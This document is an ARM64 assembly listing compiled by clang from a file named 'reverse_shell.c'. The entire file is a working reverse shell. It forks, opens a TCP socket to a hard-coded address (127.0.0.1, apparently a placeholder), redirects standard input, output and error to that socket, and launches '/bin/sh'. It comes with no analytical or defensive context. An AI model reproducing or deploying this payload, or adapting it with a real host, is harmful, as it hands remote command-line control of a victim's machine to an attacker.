	.text
	.file	"reverse_shell.c"
	.globl	main                    // -- Begin function main
	.p2align	2
	.type	main,@function
main:                                   // @main
// %bb.0:
	sub	sp, sp, #112            // =112
	stp	x29, x30, [sp, #96]     // 16-byte Folded Spill
	add	x29, sp, #96            // =96
	mov	w8, #0
	mov	w9, #2
	adrp	x10, .L.str
	add	x10, x10, :lo12:.L.str
	mov	w11, #52636
	mov	w12, #2
	mov	w13, #1
	mov	w2, #16
	adrp	x14, .L.str.1
	add	x14, x14, :lo12:.L.str.1
	mov	x15, #0
	sub	x16, x29, #32           // =32
	stur	wzr, [x29, #-4]
	stur	w0, [x29, #-8]
	stur	x1, [x29, #-16]
	stur	w8, [x29, #-40]         // 4-byte Folded Spill
	stur	w9, [x29, #-44]         // 4-byte Folded Spill
	str	x10, [sp, #40]          // 8-byte Folded Spill
	str	w11, [sp, #36]          // 4-byte Folded Spill
	str	w12, [sp, #32]          // 4-byte Folded Spill
	str	w13, [sp, #28]          // 4-byte Folded Spill
	str	w2, [sp, #24]           // 4-byte Folded Spill
	str	x14, [sp, #16]          // 8-byte Folded Spill
	str	x15, [sp, #8]           // 8-byte Folded Spill
	str	x16, [sp]               // 8-byte Folded Spill
	bl	fork
	ldur	w8, [x29, #-44]         // 4-byte Folded Reload
	sturh	w8, [x29, #-32]
	ldr	x10, [sp, #40]          // 8-byte Folded Reload
	mov	x0, x10
	bl	inet_addr
	stur	w0, [x29, #-28]
	ldr	w8, [sp, #36]           // 4-byte Folded Reload
	ldr	x10, [sp]               // 8-byte Folded Reload
	strh	w8, [x10, #2]
	ldr	w0, [sp, #32]           // 4-byte Folded Reload
	ldr	w1, [sp, #28]           // 4-byte Folded Reload
	ldur	w2, [x29, #-40]         // 4-byte Folded Reload
	bl	socket
	stur	w0, [x29, #-36]
	ldur	w0, [x29, #-36]
	ldr	x1, [sp]                // 8-byte Folded Reload
	ldr	w2, [sp, #24]           // 4-byte Folded Reload
	bl	connect
	ldur	w8, [x29, #-36]
	mov	w0, w8
	ldur	w1, [x29, #-40]         // 4-byte Folded Reload
	bl	dup2
	ldur	w8, [x29, #-36]
	mov	w0, w8
	ldr	w1, [sp, #28]           // 4-byte Folded Reload
	bl	dup2
	ldur	w8, [x29, #-36]
	mov	w0, w8
	ldr	w1, [sp, #32]           // 4-byte Folded Reload
	bl	dup2
	ldr	x10, [sp, #16]          // 8-byte Folded Reload
	mov	x0, x10
	ldr	x1, [sp, #8]            // 8-byte Folded Reload
	ldr	x2, [sp, #8]            // 8-byte Folded Reload
	bl	execve
	ldur	w8, [x29, #-40]         // 4-byte Folded Reload
	mov	w0, w8
	ldp	x29, x30, [sp, #96]     // 16-byte Folded Reload
	add	sp, sp, #112            // =112
	ret
.Lfunc_end0:
	.size	main, .Lfunc_end0-main
                                        // -- End function
	.type	.L.str,@object          // @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"127.0.0.1"
	.size	.L.str, 10

	.type	.L.str.1,@object        // @.str.1
.L.str.1:
	.asciz	"/bin/sh"
	.size	.L.str.1, 8


	.ident	"clang version 9.0.1 "
	.section	".note.GNU-stack","",@progbits
